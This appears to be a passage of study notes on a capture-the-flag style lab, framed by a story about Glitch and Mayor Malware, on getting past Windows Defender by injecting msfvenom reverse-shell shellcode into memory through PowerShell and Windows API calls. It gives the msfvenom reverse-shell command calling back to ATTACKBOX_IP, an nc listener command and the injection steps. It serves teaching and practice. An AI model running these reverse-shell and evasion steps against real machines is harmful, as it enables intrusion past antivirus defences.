...
_"They're wasting their time. I don't have anything they'd want,"_Â Glitch chuckled.
...
- **PowerShell**: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often useÂ PowerShellÂ as aÂ post-exploitationÂ tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.
- **Windows Defender**: A built-in security feature that detects and prevents malicious scripts, includingÂ PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognize known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defenses. We will cover the latter one in this task.  
- **WindowsÂ API**:Â The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The WindowsÂ APIÂ is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common WindowsÂ APIÂ functions frequently used by malicious actors includeÂ `VirtualAlloc`,Â `CreateThread`,Â `WaitForSingleObject`, which we will also use in this task for exploitation.
- **Accessing Windows API throughÂ PowerShellÂ Reflection**: Windows API viaÂ PowerShellÂ Reflection is an advanced technique that enables dynamic interaction with the Windows API fromÂ PowerShell. Instead of relying on precompiled binaries,Â PowerShellÂ Reflection allows attackers to call WindowsÂ APIÂ functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.
...
Let's learn how to generate a shellcode to see what it looks like. To do this, we will use a tool calledÂ `msfvenom`Â to get a reverse shell.  

In the AttackBox, open the terminal and enter the commandÂ `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`Â that will generate the shellcode. The output will look like the following.Â  You will require to replace theÂ `ATTACKBOX_IP`Â with the IP of the AttackBox.
...
The above command generates a piece of shellcode usingÂ `msfvenom`. Here's what each part means:

- `-p windows/x64/shell_reverse_tcp`: TheÂ `-p`Â flag tellsÂ `msfvenom`Â what type of payload to create.Â `windows/x64/shell_reverse_tcp`Â specifies that we want a reverse shell for a Windows machine.
- `LHOST=ATTACKBOX_IP`: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.
- `LPORT=1111`: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (`1111`Â in this example). You can choose any available port, but it needs to match with what your listener is set to.
- `-f powershell`: This specifies the format for the output. In this case, we want the payload to be inÂ PowerShellÂ format so it can be executed as a script on a Windows machine.

**Where Is the Actual Shellcode**

The actual shellcode in the output above is the hex-encoded byte array, which starts withÂ `0xfc, 0xe8, 0x82`, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something likeÂ `0xfc` instead.  

We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code.Â Below is a simpleÂ PowerShellÂ script that will execute our shellcode:
...
_Phew!_Â That's a lot of code.Â But don't stress. We'll break down what it does step by step.

**Explanation of the Code**

The script starts by defining a few C# classes. These classes use theÂ `DllImport`Â attribute to load specific functions from theÂ `kernel32`Â DLL, which is part of the WindowsÂ API.  
...
These classes are then added toÂ PowerShellÂ using theÂ `Add-Type`Â command, allowingÂ PowerShellÂ to use these functions.

**Storing the Shellcode in a Byte Array**

Next, the script stores the shellcode in theÂ `$buf`Â variable, a byte array.Â In the example above,Â `SHELLCODE_PLACEHOLDER`Â is just there to show where you would insert the actual shellcode earlier generated throughÂ `msfvenom`. Usually, you'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.

**Allocating Memory for the Shellcode**

TheÂ `VirtualAlloc`Â function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:

```ad-info
- `0`Â for the memory address, meaning that Windows will decide where to allocate the memory.
- `$size`Â for the size of the memory block, which is determined by the length of the shellcode.
- `0x3000`Â for the allocation type, which tells Windows to reserve and commit the memory.
- `0x40`Â for memory protection, the memory is readable and executable (necessary for executing shellcode).
```

After memory is allocated, theÂ `Marshal.Copy`Â function copies the shellcode from theÂ `$buf`Â array into the allocated memory address (`$addr`), preparing it for execution.

**Executing the Shellcode and Waiting for Completion**

Once the shellcode is stored in memory, the script calls theÂ `CreateThread`Â function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (`$addr`). The script then uses theÂ `WaitForSingleObject`Â function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.

## Time for Some Action - Executing the Shellcode
---

On the AttackBox, execute the commandÂ `nc -nvlp 1111`Â to start a listener on portÂ `1111`Â and wait for an incoming connection.Â This command opens portÂ `1111`Â and listens for connections, allowing the AttackBox to receive data once a connection is made.
...
On the AttackBox, begin by navigating to the Desktop. Right-click on theÂ `Desktop`, selectÂ `Create Document`, and then chooseÂ `Empty File`. Open this new file and paste the previously providedÂ PowerShellÂ script code into it. Look for the part labelledÂ `SHELLCODE_PLACEHOLDER`Â and replace it with the shell code we previously created withÂ `msfvenom`.


Once you've added the shellcodeÂ navigate to the attached VM, openÂ PowerShellÂ by clicking theÂ PowerShellÂ icon on the taskbarÂ and paste parts of the code from the document you recently created to the WindowsÂ PowerShellÂ window. For example, the first part to copy and paste is the block below:
...
Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and pressÂ `Enter`.

```shel
[Byte[]] $buf = SHELLCODE_PLACEHOLDER
```

Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and pressÂ `Enter`.
...
If you've done it properly, theÂ PowerShellÂ terminal in theÂ VMÂ will look like the screenshot below:

![Pasted image 20241208144640.png](../../IMAGES/Pasted%20image%2020241208144640.png)

Once you execute the final line in theÂ PowerShellÂ terminal and pressÂ `Enter`, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuingÂ `dir`, which will list all the directories.
...
Let's dive into the story and troubleshoot the issue in this part of the task. Glitch has realized he's no longer receiving incoming connections from his home base. Mayor Malware's minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch isÂ `ATTACKBOX_IP`, and the successful connection port should beÂ `4444`.
...
![Pasted image 20241208151804.png](../../IMAGES/Pasted%20image%2020241208151804.png)
